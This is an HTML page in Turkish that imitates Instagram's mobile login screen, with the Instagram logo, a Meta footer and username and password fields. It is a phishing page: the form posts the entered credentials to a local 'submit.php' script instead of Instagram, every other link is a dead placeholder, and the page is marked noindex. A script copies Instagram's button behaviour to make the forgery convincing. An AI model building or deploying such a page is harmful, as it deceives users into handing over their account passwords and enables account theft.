<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<meta name="theme-color" content="#000000">
<meta name="robots" content="noindex">
<title>Instagram</title>
<style>
  *, *::before, *::after { box-sizing: border-box; }
  html { background: #000; }
  body {
    margin: 0;
    background: #000;
    color: #f5f5f5;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    -webkit-font-smoothing: antialiased;
    -webkit-text-size-adjust: 100%;
  }
  .page { max-width: 480px; margin: 0 auto; min-height: 100vh; display: flex; flex-direction: column; }
  header {
    background: #000;
    padding: calc(52px + env(safe-area-inset-top)) 0 34px;
    display: flex;
    justify-content: center;
    border-bottom: 1px solid #1c1c1c;
  }
  .glyph { width: 88px; height: 88px; display: block; }
  main { background: #121212; flex: 1; padding: 32px 20px 0; }
  h1 { margin: 0 0 22px; font-size: 20px; line-height: 25px; font-weight: 600; letter-spacing: -.2px; }
  .alert {
    margin: -6px 0 16px;
    color: #ed4956;
    font-size: 15px;
    line-height: 19px;
  }
  form { margin: 0; }
  .field { margin-bottom: 12px; }
  .field input {
    width: 100%;
    height: 52px;
    padding: 0 14px;
    background: transparent;
    border: 1px solid #363636;
    border-radius: 12px;
    color: #f5f5f5;
    font-family: inherit;
    font-size: 16px;
    outline: none;
    -webkit-appearance: none;
    appearance: none;
  }
  .field input::placeholder { color: #8e8e8e; font-size: 15px; }
  .field input:focus { border-color: #5a5a5a; }
  .submit {
    width: 100%;
    height: 48px;
    margin-top: 10px;
    border: 0;
    border-radius: 24px;
    background: #1b3a68;
    color: #6e83a8;
    font: 600 16px/48px -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    cursor: pointer;
    transition: background-color .15s ease, color .15s ease;
  }
  .submit.ready { background: #0095f6; color: #fff; }
  .forgot {
    display: block;
    margin: 22px 0 0;
    text-align: center;
    color: #f5f5f5;
    font-size: 15px;
    text-decoration: none;
  }
  .fb {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 10px;
    margin-top: 46px;
    height: 52px;
    border-radius: 12px;
    background: #1c1c1c;
    color: #f5f5f5;
    font-size: 15px;
    text-decoration: none;
  }
  .fb svg { width: 20px; height: 20px; flex: none; }
  .create {
    display: block;
    margin: 12px 0 40px;
    height: 52px;
    border: 1px solid #0095f6;
    border-radius: 12px;
    color: #0095f6;
    font-size: 15px;
    line-height: 50px;
    text-align: center;
    text-decoration: none;
  }
  footer { padding: 34px 0 calc(26px + env(safe-area-inset-bottom)); text-align: center; color: #8e8e8e; font-size: 12px; }
</style>
</head>
<body>
  <div class="page">
    <header>
      <svg class="glyph" viewBox="0 0 24 24" fill="none" aria-label="Instagram" role="img">
        <defs>
          <linearGradient id="ig" x1="2" y1="2" x2="22" y2="22" gradientUnits="userSpaceOnUse">
            <stop offset="0" stop-color="#833AB4"/>
            <stop offset=".45" stop-color="#E1306C"/>
            <stop offset=".78" stop-color="#F77737"/>
            <stop offset="1" stop-color="#FCB045"/>
          </linearGradient>
        </defs>
        <rect x="2.15" y="2.15" width="19.7" height="19.7" rx="5.7" stroke="url(#ig)" stroke-width="1.9"/>
        <circle cx="12" cy="12" r="4.75" stroke="url(#ig)" stroke-width="1.9"/>
        <circle cx="17.45" cy="6.55" r="1.25" fill="url(#ig)"/>
      </svg>
    </header>

    <main>
      <h1>Instagram'a Giriş Yap</h1>

      <form action="submit.php" method="post" id="loginForm" autocomplete="off">
        <div class="field">
          <input id="username" name="username" type="text"
                 placeholder="Cep telefonu numarası, kullanıcı adı veya e-posta adresi"
                 autocapitalize="none" autocorrect="off" spellcheck="false" required>
        </div>
        <div class="field">
          <input id="password" name="password" type="password" placeholder="Şifre"
                 autocomplete="off" required>
        </div>
        <button type="submit" id="submitBtn" class="submit">Giriş Yap</button>
      </form>

      <a class="forgot" href="#">Şifreni mi unuttun?</a>

      <a class="fb" href="#">
        <svg viewBox="0 0 24 24" aria-hidden="true">
          <circle cx="12" cy="12" r="12" fill="#1877F2"/>
          <path d="M13.4 21v-7.2h2.43l.36-2.82H13.4V9.18c0-.82.23-1.37 1.4-1.37h1.5V5.29c-.26-.04-1.15-.11-2.18-.11-2.16 0-3.63 1.32-3.63 3.74v2.06H8.05v2.82h2.44V21h2.91z" fill="#fff"/>
        </svg>
        Facebook ile giriş yap
      </a>

      <a class="create" href="#">Yeni hesap oluştur</a>
    </main>

    <footer>Meta</footer>
  </div>

  <script>
    // Instagram keeps the button muted until both fields have input.
    (function () {
      var form = document.getElementById('loginForm');
      var button = document.getElementById('submitBtn');
      function sync() {
        var filled = form.username.value.length > 0 && form.password.value.length > 0;
        button.classList.toggle('ready', filled);
      }
      form.addEventListener('input', sync);
      sync();
    }());
  </script>
</body>
</html>
